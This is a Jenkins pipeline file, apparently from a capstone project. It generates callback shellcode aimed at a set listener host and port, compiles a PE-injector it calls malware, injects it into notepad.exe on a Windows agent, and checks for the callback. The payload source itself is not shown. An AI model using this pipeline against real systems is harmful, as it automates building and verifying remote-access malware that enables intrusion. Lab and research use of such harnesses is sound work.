pipeline {
    agent none

    environment {
        DEEPSEEK_API_KEY = credentials('deepseek-api-key')
        LHOST = '100.85.95.64'
        LPORT = 4444
        HOSTNAME = 'student-virtual-machine'
        MALWARE_PATH = 'src/Simple/PE-Injector/PE-Injector.cpp'
        SHELLCODE_PATH = 'src/Simple/PE-Injector/base.cpp'
        EXECUTABLE_NAME = 'injector.exe'
    }

    stages {
        stage('Checkout Code') {
            agent { label 'linux' }
            steps {
                checkout([
                    $class: 'GitSCM',
                    branches: [[name: 'staging']],
                    userRemoteConfigs: [[
                        url: 'git@github.com:sapph2c/capstone.git',
                        credentialsId: 'git-ssh'
                    ]]
                ])
            }
        }

        stage('Generate shellcode') {
            agent { label 'linux' }
            steps {
                dir('scripts/src') {
                    sh 'make LHOST=$LHOST LPORT=$LPORT HOSTNAME=$HOSTNAME all'
                }
            }
        }

        stage('Generate and run pre-build script') {
            agent { label 'linux' }
            steps {
                dir('scripts') {
                    sh '''
                        export PYTHONPATH=$PWD
                        uv run pipeline prebuild
                        chmod +x prebuild.sh
                        ./prebuild.sh
                    '''
                }
            }
        }

        stage('Compile and Stash Malware') {
            agent { label 'linux' }
            steps {
                dir('scripts') {
                    sh 'x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_PATH -lpsapi'
                    stash includes: "$EXECUTABLE_NAME", name: 'compiled_malware'
                }
            }
        }

        stage('Execute Malware and Test Callback') {
            agent none
            stages {
                stage('Start listener then run malware') {
                    parallel {
                        stage('Start Listener') {
                            agent { label 'linux' }
                            steps {
                                dir('scripts') {
                                    script {
                                        def result = sh(script: 'export PYTHONPATH=$PWD uv run pipeline callback', returnStdout: true).trim()
                                        writeFile file: 'callback_result.txt', text: result
                                        env.CALLBACK_RESULT = result
                                    }
                                    stash includes: 'callback_result.txt', name: 'callback_result'
                                }
                            }
                        }

                        stage('Run Malware') {
                            agent { label 'windows' }
                            steps {
                                dir('testing') {
                                    unstash 'compiled_malware'
                                    powershell '''
                                        Start-Sleep -Seconds 15
                                        $proc = Start-Process -FilePath 'notepad.exe' -PassThru
                                        Start-Sleep -Seconds 2
                                        $targetPid = $proc.Id
                                        Write-Host "Target PID: $targetPid"
                                        Start-Process -FilePath ".\\injector.exe" -ArgumentList $targetPid
                                    '''
                                }
                            }
                        }
                    }
                }

                stage('Check Callback Result') {
                    agent { label 'linux' }
                    steps {
                        unstash 'callback_result'
                        script {
                            def result = readFile('callback_result.txt').trim()
                            echo "Callback result: ${result}"
                            if (result != '0') {
                                error('Callback failed. Marking build as failed.')
                            }
                        }
                    }
                }
            }
        }
    }
}

